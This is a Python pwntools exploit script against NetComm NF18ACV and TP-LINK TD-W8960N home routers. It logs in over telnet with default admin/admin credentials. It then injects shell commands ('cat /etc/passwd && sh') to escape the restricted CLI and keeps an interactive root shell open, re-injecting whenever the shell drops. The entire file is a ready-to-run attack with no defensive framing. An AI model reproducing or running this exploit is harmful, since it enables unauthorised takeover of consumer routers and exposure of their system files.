from pwn import *
from time import sleep

FLAG_MODEL_CHK = True

 # for self-chk purposes only 
CONFIRMED_MODELS = {
	"NetComm NF18ACV": b'NF18ACV',
	"TP-LINK TD-W8960N": b'TD-W8960N 5.0 DSL Modem Router',
}

IP = "192.168.1.1"
PORT = 23 #telnet

# always-standard login pass :joy:
USERNAME = "admin"
PASSWORD = "admin"

# consts for script itself
PROMPT_TELNET = b'> '
SHELL = "sh"
SHELL_SIGNATURE = b'shell'

## or ";" instead of "&&". Also works. But not "||"
PAYLOAD_QUICK = "cat / ; "+SHELL 
PAYLOAD_SHOWOFF = "cat /etc/passwd && "+SHELL
io = remote(IP, PORT) 

# model header is always passed on Netcomm
print("1. model")
buf = io.recvline()
print(buf)
if(FLAG_MODEL_CHK):
	print("Model checking is enabled, the script will no confirmed model found")
	
	for k,v in CONFIRMED_MODELS.items():
		if(buf.find(v) != -1):
			model = k
			break
	assert(len(model)) # self-chk
	print("Model detected: "+model)

print("2: login")
io.recvuntil(b'Login: ')
io.sendline(USERNAME)
sleep(0.5)

print("3: pass")
io.recvuntil(b'Password: ')
io.sendline(PASSWORD)
sleep(0.5)

try:
	buf = io.recv()
	if(buf.find(b'incorrect') != -1):
		print("Somehow credentials are incorrect?")
		assert(False)
	elif(buf.find(PROMPT_TELNET) != -1):
		print("All good, logged in..")
	else:
		print("Not sure what happened. Check below")
		print(buf)
		assert(False)
		
	print("Now let's try for totally secure inner credentials, ")
	print("While trying for arbitrary code execution!")
	
	io.sendline(PAYLOAD_SHOWOFF)
	sleep(0.5)
	buf = io.recv()
	
	if(buf.find(SHELL_SIGNATURE) == -1):
		print("I guess no shell?")
		print(buf)
		assert(False)
	else:
		print("========================")
		print("Shell obtained successfully!")
		print("Now, shell is kind of unstable, and may randomly")
		print("glitch out into telnet script; hence:")
		print("1xCTRL+C to respring/retether the hack")
		print("2xCTRL+C / 1xCTRL+Z to exit")
		print("========================")
		print(buf)
		while(1):
			io.interactive(prompt = "::")
			shell_screwed = 1
			while(shell_screwed):
				print("trying for shell...")
				io.sendline(PAYLOAD_QUICK)
				sleep(0.25)
				buf = io.recv()
				shell_screwed = (buf.find(SHELL_SIGNATURE) == -1)
				sleep(0.25)
				
	
except Exception as e:
	raise e
